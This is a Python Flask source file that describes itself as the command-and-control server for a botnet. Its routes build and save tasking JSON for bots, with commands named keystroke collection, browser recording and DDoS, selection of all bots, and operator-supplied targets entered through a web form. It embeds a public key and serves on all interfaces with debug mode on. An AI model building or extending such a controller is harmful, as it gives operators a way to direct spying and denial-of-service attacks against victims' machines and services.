from flask import Flask, render_template, request
from flask import jsonify
import time
import json
"""
PLEASE NOTE:
this file will run on the cnc - the botnet manager.
To avoid unnecessary charges and uptime, it is turned off by default. if you want to turn it up - please contact us.
"""
with open('new_file.json', 'w') as f:
    print("The json file is created")
app = Flask(__name__, static_folder='static')

@app.route("/")
def hello_world():
    return "<h1>Hello World!</h1>"

@app.route("/summary")
def summary():
    d = attack_summary()
    with open('data.json', 'w') as f:
        json.dump(d, f)
    return jsonify(d)

def attack_summary():
    dict={"command_ID":"",
     "command_name":["collect_keystrokes", "browser_recording", "ddos"],
     "command_type":["harvesting", "obeying"],
     "command_bot_names":"*",
     "start_time": 'Sat Aug 20 00:00:00 2022',
     "end_time": 'Sat Aug 20 00:10:00 2022',
     "targets":""}
    return dict


def get_public_key():
    return """AAAAB3NzaC1yc2EAAAADAQABAAABgQDAJL3HcRnpToEotri
    sR5+cBftyn2uY6bvTI8b6FPKRLsDo7sFhTTlKRu62LTFncyPnGiF++3Kqi20AkE
    K36qo94t2pM6s2QCAaFjiauUaccppQqunNbGkBHYqSum21U5IX11ile83cOVMed
    V5TZsKziqsf7P6FVfwM5+iTW8astaU+zDBbBUkzX3pPS75pkWuBYxr/xy4eFNNg
    ITQXnfFzSdvH3iS31GDObrXu1MOjqFPvRI0EJX9WKfykb4la6uQ1WaoSMY5pV8J
    jj3YAjI7uuA96SVe5sHjXbp3cFchLAKjF/qB6aG/dZbn/S2Dfi1Q9CXKcZV/omO
    ObmGxhZh0g4+qgmU0EtEj6cqsB7FwiwKysVd4f09aM3ls6SKHXZRG2zpkilasnI
    r2Fw0cGvIbP5ePwFweMovPbddqUdzAHkcd71qoIqB2I64t8pTuLjTPacslftC0+
    GeQMNBQG2waCNmZHSNrmPykoyOPWuJUdnb2p7O0431GNH/ISP6Rl2T0"""

@app.route("/summary_form")
def summary_form():
    return render_template('summary_form.html')


@app.route("/JSON_created", methods=["POST"])
def JSON_created():
     d={"command_ID":request.form.get('id'),
     "command_name":request.form.get('name'),
     "command_type":request.form.get('type'),
     "command_bot_names":request.form.get('bot_name'),
     "start_time":request.form.get('start'),
     "end_time": request.form.get('end'),
     "targets":request.form.get('targets')}
     with open('data.json', 'w') as f:
        json.dump(d, f)
     #return jsonify(dict) 
     return "<h1>Your JSON file was created succesfully</h1>"



if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80 ,debug=True)